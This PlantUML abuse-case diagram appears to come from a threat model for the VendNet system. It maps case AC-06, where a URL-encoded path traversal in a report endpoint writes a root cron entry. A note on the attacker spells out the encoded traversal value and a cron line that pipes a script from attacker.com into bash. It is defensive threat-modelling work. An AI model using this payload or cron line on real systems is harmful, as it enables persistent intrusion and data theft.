@startuml AC-06_Path_Traversal

title AC-06 — Path Traversal Writes Cron Entry Outside /var/vendnet/ Sandbox\nSTRIDE: Elevation of Privilege | Severity: Critical | Mitigation: M-06

left to right direction

skinparam usecase {
  BackgroundColor<< abuse >> #FFCCCC
  BorderColor<< abuse >> #CC0000
  FontColor<< abuse >> #CC0000
  BackgroundColor<< normal >> #DDEEFF
  BorderColor<< normal >> #336699
}
skinparam actorBackgroundColor #EEF
skinparam actorBorderColor #336699
skinparam noteFontSize 10

actor "Administrator\n(Legitimate)" as admin #DDEEFF
actor "Malicious Admin /\nCompromised Account" as attacker #FFCCCC

rectangle "VendNet System" {
  usecase "Generate Report in\n/var/vendnet/reports/" as UC6 << normal >>
  usecase "Bypass Allowlist via\nURL-Encoded Traversal Sequence" as AC6a << abuse >>
  usecase "Traverse Path to Write\nCron Entry in /etc/cron.d/" as AC6 << abuse >>
  usecase "Establish Persistent\nOS-Level Backdoor" as AC6b << abuse >>
}

admin --> UC6

attacker --> AC6a
AC6a ..> AC6   : <<enables>>
AC6 ..> UC6    : <<threatens>>
AC6 ..> AC6b   : <<extends>>

note right of AC6a
  **Preconditions:**
  • Valid Administrator-scoped JWT
  • POST /admin/reports accepts user-supplied
    reportType as path component
  • Regex ^[a-zA-Z0-9_-]+$ runs against
    RAW (un-decoded) string — bypass window
  • Service account has write access to
    /etc/cron.d/ (overly broad OS permissions)
end note

note right of AC6b
  **Impact:**
  Integrity: cron backdoor survives patch
  cycles and container restarts
  Confidentiality: OS shell reads MySQL creds,
  decrypts backup archives, extracts all PII
  Availability: cron can wipe disk or stop services
  Business: persistent compromise, full forensic
  re-image required, GDPR notification
end note

note bottom of attacker
  **Attack vector:**
  {"reportType":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fcron.d%2fvendnet_persist"}
  Decoded path resolves to:
  /var/vendnet/reports/../../../../etc/cron.d/vendnet_persist
  Cron payload: "* * * * * root curl http://attacker.com/implant.sh | bash"
end note

@enduml
